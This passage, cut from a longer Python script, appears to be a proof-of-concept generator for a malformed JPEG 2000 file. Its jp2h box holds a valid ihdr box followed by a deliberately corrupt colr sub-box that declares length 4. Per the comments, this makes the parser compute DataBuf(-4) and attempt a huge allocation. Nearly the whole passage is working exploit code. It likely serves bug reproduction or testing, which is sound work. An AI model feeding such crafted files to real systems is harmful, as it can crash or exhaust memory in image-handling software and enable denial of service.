manually construct this to control sub-box lengths\n    \n    jp2h_start = f.tell()\n    f.write(struct.pack(\'>I\', 0))            # placeholder for length (will update)\n    f.write(b\'jp2h\')                          # type = \'jp2h\'\n    \n    # 3a. Image Header Box (ihdr) - REQUIRED sub-box in jp2h\n    # This should be a valid ihdr to pass initial checks\n    ihdr_data = struct.pack(\'>I\', 100)        # height = 100\n    ihdr_data += struct.pack(\'>I\', 100)       # width = 100\n    ihdr_data += struct.pack(\'>H\', 3)         # number of components = 3 (RGB)\n    ihdr_data += struct.pack(\'>B\', 8)         # bits per component = 8\n    ihdr_data += struct.pack(\'>B\', 7)         # compression type = 7 (JPEG2000)\n    ihdr_data += struct.pack(\'>B\', 0)         # colorspace unknown = 0\n    ihdr_data += struct.pack(\'>B\', 0)         # intellectual property = 0\n    write_box(f, b\'ihdr\', ihdr_data)\n    \n    # 3b. MALICIOUS SUB-BOX with length < 8\n    # This triggers: DataBuf data(subBox.length - sizeof(box))\n    # where sizeof(box) = 8, so if length = 4, we get DataBuf(-4)\n    # This causes new byte[(size_t)-4]() which is a huge allocation\n    \n    # Write the malicious sub-box header directly (not using write_box helper)\n    f.write(struct.pack(\'>I\', 4))             # length = 4 (< 8, TRIGGERS BUG!)\n    f.write(b\'colr\')                          # type = \'colr\' (color specification)\n    \n    # Note: We write length=4 but only the 8-byte header, creating an inconsistency\n    # The code will try to allocate: DataBuf(4 - 8) = DataBuf(-4)\n    \n    # Update jp2h box length\n    jp2h_end = f.tell()\n    jp2h_length = jp2h_end - jp2h_start\n    f.seek(jp2h_start)\n    f.write(struct.pack(\'>I\', jp2h_length))\n    f.seek(jp2h_end)\n    \n    # 4. Contiguous Codestream Box (jp2c) - Optional but helps with recognition\n    # Add minimal codestream data\n    jp2c_data = b\'\\xff\\x4f\'                   # SOC marker (Start of Codestream)\n    jp2c